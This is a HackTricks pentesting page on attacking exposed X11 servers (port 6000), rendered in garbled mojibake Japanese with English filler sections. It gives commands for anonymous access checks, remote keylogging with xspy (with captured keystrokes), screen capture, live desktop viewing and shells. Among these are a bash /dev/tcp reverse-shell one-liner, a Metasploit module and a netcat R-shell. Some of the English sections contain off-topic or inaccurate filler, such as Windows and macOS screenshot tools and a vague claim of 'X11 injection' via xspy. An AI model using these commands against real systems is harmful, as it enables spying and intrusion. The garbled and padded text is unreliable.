# 6000 - X11ã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofã‚’ãƒ•ã‚©ãƒ­ãƒ¼**](https://bit.ly/3xrrDrL) **ã—ã¦ã€web3ã®ãƒã‚°ã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã³ã¾ã—ã‚‡ã†**

ğŸ web3ã®ãƒã‚°ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚€

ğŸ”” æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã«ã¤ã„ã¦é€šçŸ¥ã‚’å—ã‘ã‚‹

ğŸ’¬ ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ‡ã‚£ã‚¹ã‚«ãƒƒã‚·ãƒ§ãƒ³ã«å‚åŠ ã™ã‚‹

## åŸºæœ¬æƒ…å ±

X Window Systemï¼ˆXã¨ã‚‚å‘¼ã°ã‚Œã‚‹ï¼‰ã¯ã€ãƒ“ãƒƒãƒˆãƒãƒƒãƒ—ãƒ‡ã‚£ã‚¹ãƒ—ãƒ¬ã‚¤ç”¨ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚·ã‚¹ãƒ†ãƒ ã§ã‚ã‚Šã€UNIXãƒ™ãƒ¼ã‚¹ã®ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã§ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚Xã¯GUIãƒ™ãƒ¼ã‚¹ã®ç’°å¢ƒã®åŸºæœ¬çš„ãªãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’æä¾›ã—ã¾ã™ã€‚ã¾ãŸã€Xã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’å¼·åˆ¶ã—ã¾ã›ã‚“ - å€‹ã€…ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒã“ã‚Œã‚’å‡¦ç†ã—ã¾ã™ã€‚\
å‚ç…§å…ƒï¼š[https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)

**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆï¼š** 6000
```
PORT       STATE   SERVICE
6000/tcp   open    X11
```
## åˆ—æŒ™

**åŒ¿åæ¥ç¶š**ã‚’ç¢ºèªã—ã¾ã™ã€‚
```bash
nmap -sV --script x11-access -p <PORT> <IP>
msf> use auxiliary/scanner/x11/open_x11
```
#### ãƒ­ãƒ¼ã‚«ãƒ«åˆ—æŒ™

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ›ãƒ¼ãƒ ãƒ•ã‚©ãƒ«ãƒ€ã«ã‚ã‚‹ãƒ•ã‚¡ã‚¤ãƒ« **`.Xauthority`** ã¯ã€**X11ã®èªè¨¼**ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚[**ã“ã“ã‹ã‚‰**](https://stackoverflow.com/a/37367518)ï¼š

> MIT-magic-cookie-1: 128ãƒ“ãƒƒãƒˆã®ã‚­ãƒ¼ï¼ˆ"cookie"ï¼‰ã‚’ç”Ÿæˆã—ã€ãã‚Œã‚’ \~/.Xauthorityï¼ˆã¾ãŸã¯XAUTHORITYç’°å¢ƒå¤‰æ•°ãŒæŒ‡ã™å ´æ‰€ï¼‰ã«ä¿å­˜ã—ã¾ã™ã€‚ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯ãã‚Œã‚’å¹³æ–‡ã§ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡ã—ã¾ã™ï¼ã‚µãƒ¼ãƒãƒ¼ã¯ã“ã® "cookie" ã®ã‚³ãƒ”ãƒ¼ã‚’æŒã£ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã€ã‚‚ã—ãã†ã§ã‚ã‚Œã°æ¥ç¶šãŒè¨±å¯ã•ã‚Œã¾ã™ã€‚ã‚­ãƒ¼ã¯DMXã«ã‚ˆã£ã¦ç”Ÿæˆã•ã‚Œã¾ã™ã€‚

{% hint style="warning" %}
**ã‚¯ãƒƒã‚­ãƒ¼**ã‚’ä½¿ç”¨ã™ã‚‹ã«ã¯ã€ç’°å¢ƒå¤‰æ•° **`export XAUTHORITY=/path/to/.Xauthority`** ã‚’è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

## æ¥ç¶šã®æ¤œè¨¼
```bash
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
```
## ã‚­ãƒ¼ãƒ­ã‚®ãƒ³ã‚°

[xspy](http://tools.kali.org/sniffingspoofing/xspy)ã¯ã‚­ãƒ¼ãƒœãƒ¼ãƒ‰ã®ã‚­ãƒ¼ã‚¹ãƒˆãƒ­ãƒ¼ã‚¯ã‚’å—…è¦šã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚

ã‚µãƒ³ãƒ—ãƒ«å‡ºåŠ›ï¼š
```
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
```
## ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚·ãƒ§ãƒƒãƒˆã®ã‚­ãƒ£ãƒ—ãƒãƒ£

To capture screenshots during a penetration test, you can use various tools and techniques. Here are some methods you can try:

### 1. Scrot

Scrot is a command-line tool that allows you to capture screenshots in Linux. You can install it using the following command:

```bash
sudo apt-get install scrot
```

Once installed, you can use the `scrot` command to capture screenshots. For example, to capture the entire screen, you can run:

```bash
scrot screenshot.png
```

### 2. Shutter

Shutter is a feature-rich screenshot tool for Linux. You can install it using the following command:

```bash
sudo apt-get install shutter
```

Once installed, you can launch Shutter from the applications menu. It provides a graphical interface that allows you to capture screenshots of specific windows, regions, or the entire screen.

### 3. Flameshot

Flameshot is another powerful screenshot tool for Linux. You can install it using the following command:

```bash
sudo apt-get install flameshot
```

Once installed, you can launch Flameshot from the applications menu. It provides a user-friendly interface that allows you to capture screenshots, annotate them, and save or share them.

### 4. Snipping Tool

If you are using Windows, you can use the built-in Snipping Tool to capture screenshots. You can search for it in the Start menu and launch it. It provides various options for capturing screenshots, such as capturing a specific window, a rectangular region, or the entire screen.

### 5. Grab

If you are using macOS, you can use the built-in Grab tool to capture screenshots. You can find it in the Utilities folder, which is located in the Applications folder. It provides options for capturing the entire screen, a specific window, or a selected portion of the screen.

These are just a few examples of tools you can use to capture screenshots during a penetration test. Choose the one that best suits your needs and preferences.
```bash
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
```
## ãƒªãƒ¢ãƒ¼ãƒˆãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ãƒ“ãƒ¥ãƒ¼

æ–¹æ³•: [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)ã‹ã‚‰ã®æƒ…å ±ã§ã™ã€‚
```
./xrdp.py <IP:0>
```
æ–¹æ³•: [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)

æœ€åˆã«ã€xwininfoã‚’ä½¿ç”¨ã—ã¦ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã®IDã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

Absolute upper-left X:  0
Absolute upper-left Y:  0
Relative upper-left X:  0
Relative upper-left Y:  0
Width: 1024
Height: 768
Depth: 16
Visual: 0x21
Visual Class: TrueColor
Border width: 0
Class: InputOutput
Colormap: 0x20 (installed)
Bit Gravity State: ForgetGravity
Window Gravity State: NorthWestGravity
Backing Store State: NotUseful
Save Under State: no
Map State: IsViewable
Override Redirect State: no
Corners:  +0+0  -0+0  -0-0  +0-0
-geometry 1024x768+0+0
```
**XWatchwin**

**ãƒ©ã‚¤ãƒ–ãƒ“ãƒ¥ãƒ¼ã‚¤ãƒ³ã‚°**ã®ãŸã‚ã«ã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```bash
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```
## ã‚·ã‚§ãƒ«ã‚’å–å¾—ã™ã‚‹

To get a shell on a target system, you can exploit vulnerabilities in the X11 server or client. Here are some techniques you can use:

### 1. X11 Forwarding

If the target system has X11 forwarding enabled, you can use SSH to forward X11 traffic and run X11 applications remotely. This can be useful for running graphical tools or accessing the X11 server.

To enable X11 forwarding, use the `-X` or `-Y` option when connecting via SSH:

```bash
ssh -X user@target
```

### 2. X11 Injection

X11 injection involves injecting malicious code into an X11 server or client to gain control over the target system. This can be done by exploiting vulnerabilities in X11 libraries or by intercepting X11 traffic.

One popular tool for X11 injection is `xspy`, which allows you to intercept and modify X11 traffic. You can use it to inject malicious code and execute commands on the target system.

### 3. X11 Reverse Shell

Another technique is to create a reverse shell using X11. This involves creating a malicious X11 client that connects back to your machine and provides a shell on the target system.

To create a reverse shell, you can use tools like `xterm` or `xcalc` with the `-e` option to execute a command. For example:

```bash
xterm -e "bash -i >& /dev/tcp/your-ip/your-port 0>&1"
```

Replace `your-ip` and `your-port` with your machine's IP address and the port you want to listen on.

These are just a few techniques you can use to get a shell on a target system using X11. Remember to always obtain proper authorization before attempting any penetration testing activities.
```
msf> use exploit/unix/x11/x11_keyboard_exec
```
ä»–ã®æ–¹æ³•ï¼š

**ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ï¼š** Xrdpã¯Netcatã‚’ä»‹ã—ã¦ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å–å¾—ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å…¥åŠ›ã—ã¾ã™ï¼š

**./xrdp.py \<IP:0> â€“no-disp**

![](../.gitbook/assets/112217\_0051\_ExploitingX15.jpeg)

æ–°ã—ã„ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ‘ãƒãƒ«ãŒè¡¨ç¤ºã•ã‚Œã€Rã‚·ã‚§ãƒ«ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚ä»¥ä¸‹ã«ç¤ºã—ã¾ã™ï¼š

![](../.gitbook/assets/112217\_0051\_ExploitingX16.jpeg)

ãƒ­ãƒ¼ã‚«ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã§ãƒãƒ¼ãƒˆ5555ã§Netcatã®ãƒªã‚¹ãƒ‹ãƒ³ã‚°ãƒ¢ãƒ¼ãƒ‰ã‚’é–‹å§‹ã—ã¾ã™ã€‚ä»¥ä¸‹ã«ç¤ºã—ã¾ã™ï¼š

![](../.gitbook/assets/112217\_0051\_ExploitingX17.jpeg)

æ¬¡ã«ã€IPã¨ãƒãƒ¼ãƒˆã‚’è¿½åŠ ã—ã€R-Shellã‚’é¸æŠã—ã¾ã™ã€‚ä»¥ä¸‹ã«ç¤ºã—ã¾ã™ï¼š

![](../.gitbook/assets/112217\_0051\_ExploitingX18.jpeg)

ä»¥ä¸‹ã®ã‚ˆã†ã«ã€å®Œå…¨ãªã‚·ã‚¹ãƒ†ãƒ ã‚¢ã‚¯ã‚»ã‚¹ãŒç¢ºèªã§ãã¾ã™ï¼š

![](../.gitbook/assets/112217\_0051\_ExploitingX19.jpeg)

{% embed url="https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref" %}

## Shodan

* `port:6000 x11`

\`\`

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofã‚’ãƒ•ã‚©ãƒ­ãƒ¼**](https://bit.ly/3xrrDrL) **ã—ã¦ã€web3ã®ãƒã‚°ã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã³ã¾ã—ã‚‡ã†**

ğŸ web3ã®ãƒã‚°ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚€

ğŸ”” æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã«ã¤ã„ã¦é€šçŸ¥ã‚’å—ã‘ã‚‹

ğŸ’¬ ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ‡ã‚£ã‚¹ã‚«ãƒƒã‚·ãƒ§ãƒ³ã«å‚åŠ ã™ã‚‹

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡º**ã—ã¦ãã ã•ã„ã€‚

</details>
